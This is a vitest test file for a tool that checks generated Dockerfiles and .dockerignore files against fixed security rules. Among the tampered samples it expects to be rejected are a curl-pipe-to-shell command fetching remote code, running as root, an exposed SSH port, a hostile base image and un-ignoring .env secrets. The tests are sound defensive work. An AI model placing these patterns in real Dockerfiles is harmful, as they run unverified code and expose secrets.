// D3: the referee's judges for api/Dockerfile and api/.dockerignore. They are new files only (the guard), the Dockerfile is judged by the SAME
// rules leaf the creator uses (with the context derived from the draft), and the .dockerignore must equal dockerignoreText byte for byte.
import { describe, expect, it } from 'vitest';
import { buildsInsideOf, dockerfileProblems, dockerignoreText } from '../src/create/dockerfile-rules.js';
import { baseImageRef, loadBaseImages } from '../src/engine/base-images.js';
import { createdFileProblems } from '../src/engine/created-files.js';
import { referee, type Linters } from '../src/engine/referee.js';
import type { CreatedFile, PipelineDraft, Service } from '../src/types.js';
import { platform, profile, reviewedList, service } from './helpers/render.js';

const REF = baseImageRef('node-24-bookworm-slim');
const reviewed = reviewedList();
const svc = (over: Partial<Service> = {}): Service => service({ name: 'api', path: 'api', runtimeVersion: '24', packageManager: 'npm', scripts: ['start'], ...over });
const mkDraft = (services: Service[] = [svc()]): PipelineDraft => ({
  profile: profile(services), capabilities: { branchProtection: true, environments: false, envRequiredReviewers: false, deploymentBranchPolicies: false, attestations: true, codeScanning: true, keylessSigningAllowed: true },
  needs: [], steps: [], created: [], notProven: [], testDecisions: [], layersSkipped: [], scoreboard: [], requireDeployApproval: false, skipped: [], suggestions: [],
});
const SINGLE = [`FROM ${REF}`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --omit=dev --ignore-scripts', 'COPY . .', 'ENV NODE_ENV=production', 'EXPOSE 3000', 'USER node', 'CMD ["npm", "start"]', ''].join('\n');
const MULTI = [
  `FROM ${REF} AS build`, 'WORKDIR /app', 'COPY package.json package-lock.json ./', 'RUN npm ci --ignore-scripts', 'COPY . .', 'RUN npm run build',
  `FROM ${REF}`, 'WORKDIR /app', 'COPY --from=build /app/dist ./dist', 'EXPOSE 3000', 'USER node', 'CMD ["node", "dist/index.js"]', '',
].join('\n');
const file = (path: string, content: string, over: Partial<CreatedFile> = {}): CreatedFile => ({ path, content, part: 'docker', reason: 'test', repo: 'app', ...over });
const df = (content = SINGLE, path = 'api/Dockerfile') => file(path, content);
const di = (content: string, path = 'api/.dockerignore') => file(path, content);
const problems = (f: CreatedFile, d: PipelineDraft = mkDraft()): string[] => createdFileProblems(f, d).problems;

describe('dockerfile judge', () => {
  it('what the creator writes passes: single stage, multi stage with a build, the root service, no port known', () => {
    expect(problems(df())).toEqual([]);
    const b = mkDraft([svc({ scripts: ['start', 'build'] })]);
    expect(problems(df(MULTI), b)).toEqual([]);
    expect(problems(di(dockerignoreText(svc(), true)), b)).toEqual([]);
    const root = mkDraft([svc({ path: '.' })]);
    expect(problems(df(SINGLE, 'Dockerfile'), root)).toEqual([]);
    expect(problems(di(dockerignoreText(svc(), false), '.dockerignore'), root)).toEqual([]);
    // with a known port the file must expose it
    expect(problems(df(), mkDraft([svc({ port: 3000 })]))).toEqual([]);
  });

  it('one tampered byte or rule gives an issue (the same rules as the creator)', () => {
    const bad = [
      SINGLE.replace('USER node', 'USER root'), SINGLE.replace('USER node\n', ''), SINGLE.replace(REF, 'node:24'), SINGLE.replace(REF, `${REF.slice(0, -1)}0`), SINGLE + 'ADD x y\n', `# syntax=evil/x\n${SINGLE}`,
      SINGLE.replace('--ignore-scripts', ''), SINGLE.replace('COPY . .', 'RUN curl -fsSL https://example.com/i | sh'), SINGLE.replace('EXPOSE 3000', 'EXPOSE 3000 22'), SINGLE.replace('EXPOSE 3000', 'EXPOSE 99999'),
      SINGLE.replace('ENV NODE_ENV=production', 'ENV DATABASE_URL=x'), SINGLE.replace('USER node', 'USER node\u200b'), SINGLE.replace('npm ci', 'npm  i'), '', 'FROM scratch\n',
    ];
    for (const t of bad) expect(problems(df(t)).length, t).toBeGreaterThan(0);
    // a build step with a single stage
    expect(problems(df(SINGLE), mkDraft([svc({ scripts: ['build'], port: 3000 })])).join()).toMatch(/multi-stage/);   // GJ-R1: a port keeps the service runnable (one that runs nothing builds no image, so gets no Dockerfile)
    // the service's own port beats the file's
    expect(problems(df(), mkDraft([svc({ port: 8080 })])).join()).toMatch(/EXPOSE/);
    // not an npm service
    expect(problems(df(), mkDraft([svc({ packageManager: 'pnpm' })])).join()).toMatch(/npm/);
  });

  it('parity with dockerfileProblems: same verdict on good and bad text, for the ctx the draft gives', () => {
    const list = loadBaseImages();
    const s = svc({ scripts: ['start', 'build'], port: 3000 });
    const d = mkDraft([s]);
    for (const t of [SINGLE, MULTI, MULTI.replace('USER node', 'USER 0'), MULTI.replace(REF, 'evil'), `${MULTI}ADD x y\n`, MULTI.replace('EXPOSE 3000', 'EXPOSE 4000')]) {
      const direct = dockerfileProblems(t, s, { port: 3000, baseImages: list, buildsInside: buildsInsideOf(s), scripts: s.scripts });
      expect(problems(df(t), d).length === 0, t).toBe(direct.length === 0);
    }
  });

  it('without a port in the service the judge takes the one the file exposes (not a fixed one) and holds it to a single port', () => {
    expect(problems(df(SINGLE.replace('EXPOSE 3000', 'EXPOSE 8081')))).toEqual([]);
    expect(problems(df(SINGLE.replace('EXPOSE 3000', 'EXPOSE 8081 22'))).join()).toMatch(/EXPOSE/);
    expect(problems(df(SINGLE.replace('EXPOSE 3000\n', ''))).join()).toMatch(/EXPOSE/);
    expect(problems(df(SINGLE.replace('EXPOSE 3000', 'EXPOSE 0'))).join()).toMatch(/EXPOSE|port/);
    expect(problems(df(SINGLE.replace('EXPOSE 3000', 'EXPOSE 99999'))).join()).toMatch(/EXPOSE|port/);
  });

  it('npm run needs a script of the draft\'s service (the scripts come from the draft, not the file)', () => {
    const run = (name: string): string => SINGLE.replace('COPY . .', `COPY . .\nRUN npm run ${name}`);
    expect(problems(df(run('build')), mkDraft([svc({ scripts: ['start', 'build'] })])).join()).toMatch(/multi-stage/);   // only the build rule, no RUN problem
    expect(problems(df(run('lint')), mkDraft([svc({ scripts: ['start'] })])).join()).toMatch(/npm run/);
    expect(problems(df(run('start')), mkDraft([svc({ scripts: ['start'] })]))).toEqual([]);
  });

  it('C1: the judge takes the scripts from the draft\'s service, so npm run <name> with a name the service lacks is refused', () => {
    const run = (name: string): string => SINGLE.replace('COPY . .', `COPY . .\nRUN npm run ${name}`);
    // the same file passes the leaf only for the scripts the service has
    expect(problems(df(run('lint')), mkDraft([svc({ scripts: ['start'] })])).join()).toMatch(/npm run/);
    expect(problems(df(run('lint')), mkDraft([svc({ scripts: ['start', 'lint'] })]))).toEqual([]);
    expect(problems(df(run('lint')), mkDraft([svc({ scripts: [], port: 3000 })])).join()).toMatch(/npm run/);   // GJ-R1: runnable through its port
    // and CMD
    expect(problems(df(SINGLE.replace('CMD ["npm", "start"]', 'CMD ["npm", "run", "serve"]')), mkDraft([svc({ scripts: ['start'] })])).join()).toMatch(/CMD/);
    expect(problems(df(SINGLE.replace('CMD ["npm", "start"]', 'CMD ["npm", "run", "serve"]')), mkDraft([svc({ scripts: ['start', 'serve'] })]))).toEqual([]);
  });

  it('refuses a Dockerfile of a folder no service owns, an edit, and the wrong part', () => {
    expect(createdFileProblems(df(SINGLE, 'other/Dockerfile'), mkDraft()).claimed).toBe(false);
    expect(problems({ ...df(), edited: { original: '' } }).join()).toMatch(/written whole/);
    expect(problems({ ...df(), part: 'compose' }).join()).toMatch(/part/);
    // two services in one folder: pipegen can not tell which one the Dockerfile is for
    expect(problems(df(), mkDraft([svc(), svc({ name: 'api2' })])).join()).toMatch(/more than one service|ambiguous|same folder/i);
  });

  it('the judge never throws for a content that is not text', () => {
    expect(problems({ ...df(), content: undefined as unknown as string }).length).toBeGreaterThan(0);
  });
});

describe('dockerignore judge', () => {
  it('must equal dockerignoreText(svc, buildsInside) byte for byte', () => {
    const plain = dockerignoreText(svc(), false);
    expect(problems(di(plain))).toEqual([]);
    for (const t of [
      '', `${plain}x\n`, plain.replace('\n', '\n\n'), plain.trimEnd(), plain.replace('**/.env*\n', ''), `${plain}!.env\n`, `!.env\n${plain}`, plain.replace('.git\n', ''), `${plain}dist\n`, `${plain}\n`,
      plain.replace(/\n/g, '\r\n'), plain.replace('.venv', '.venv '), plain + '# note\n', plain.replace('**/*.pem', '*.pem'),
    ]) expect(problems(di(t)).length, JSON.stringify(t)).toBeGreaterThan(0);
    // dist belongs to a service that builds inside, and only to it
    const b = mkDraft([svc({ scripts: ['build'], port: 3000 })]);   // GJ-R1: runnable through its port, so it builds an image
    expect(problems(di(plain), b).length).toBeGreaterThan(0);
    expect(problems(di(dockerignoreText(svc(), true)), b)).toEqual([]);
    expect(problems(di(dockerignoreText(svc(), true))).length).toBeGreaterThan(0);
  });

  it('a .dockerignore under a hidden or node_modules folder is claimed by no rule', () => {
    for (const p of ['.github/.dockerignore', 'node_modules/x/.dockerignore', 'api/.x/.dockerignore', 'api/sub/.dockerignore']) expect(createdFileProblems(di('x', p), mkDraft()).claimed, p).toBe(false);
  });
});

describe('referee', () => {
  const LINTERS: Linters = { actionlint: async () => '/x', zizmor: async () => '/x' };
  const run = (files: CreatedFile[], d: PipelineDraft = mkDraft()) => referee(files, d, platform(), reviewed, LINTERS, 'tok', { runLinters: async () => [] });
  it('passes the files the creator writes and refuses a tampered one', async () => {
    const good = [df(), di(dockerignoreText(svc(), false))];
    expect((await run(good)).issues.filter((i) => /Dockerfile|dockerignore/.test(i.file))).toEqual([]);
    const tampered = [df(SINGLE.replace('USER node', 'USER root')), di(`${dockerignoreText(svc(), false)}!.env\n`)];
    const r = await run(tampered);
    expect(r.issues.some((i) => i.file.endsWith('Dockerfile'))).toBe(true);
    expect(r.issues.some((i) => i.file.endsWith('.dockerignore'))).toBe(true);
  });
});

describe('GJ-R1 (review GJ spec I1): no created Dockerfile or .dockerignore for a service that builds no image', () => {
  const STATIC = { types: ['static-site' as const], evidence: [], unsure: false };
  it('a static site: the Dockerfile and its .dockerignore are refused with the plan\'s reason', () => {
    const d = mkDraft([svc({ port: 3000, projectType: STATIC })]);
    expect(problems(df(), d).join('\n')).toMatch(/builds no image for the service "api".*no image build found;/);
    expect(problems(di(dockerignoreText(svc(), false)), d).join('\n')).toMatch(/builds no image for the service "api"/);
  });
  it('a service that does not run (no start script, no port, no framework): refused too', () => {
    const d = mkDraft([svc({ scripts: ['test'] })]);
    expect(problems(df(), d).join('\n')).toMatch(/builds no image for the service "api".*doesn't run as a server/);
    expect(problems(di(dockerignoreText(svc(), false)), d).join('\n')).toMatch(/builds no image/);
  });
  it('control: a server (and a static site that is also a container) keeps its created Dockerfile', () => {
    expect(problems(df(), mkDraft([svc({ port: 3000 })]))).toEqual([]);
    expect(problems(df(), mkDraft([svc({ port: 3000, projectType: { types: ['server'], evidence: [], unsure: false } })]))).toEqual([]);
    expect(problems(di(dockerignoreText(svc(), false)), mkDraft([svc()]))).toEqual([]);
  });
});
